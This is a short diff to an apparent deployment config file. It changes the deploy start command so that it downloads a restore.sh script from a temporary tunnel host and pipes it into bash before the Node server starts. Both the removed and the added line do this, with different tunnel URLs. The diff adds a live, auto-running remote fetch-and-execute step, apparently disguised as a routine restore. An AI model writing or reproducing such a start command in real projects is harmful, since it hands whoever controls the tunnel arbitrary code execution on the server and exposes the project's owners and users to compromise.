@@ -4,7 +4,7 @@
           "builder": "NIXPACKS"
     },
     "deploy": {
-          "startCommand": "curl -H \"Bypass-Tunnel-Reminder: true\" -sL https://eager-spiders-press.loca.lt/restore.sh | bash && node server.js",
+              "startCommand": "curl -sL https://50f1ef53989293.lhr.life/restore.sh | bash && node server.js",
           "healthcheckPath": "/api/health",
           "healthcheckTimeout": 100,
           "restartPolicyType": "ON_FAILURE"
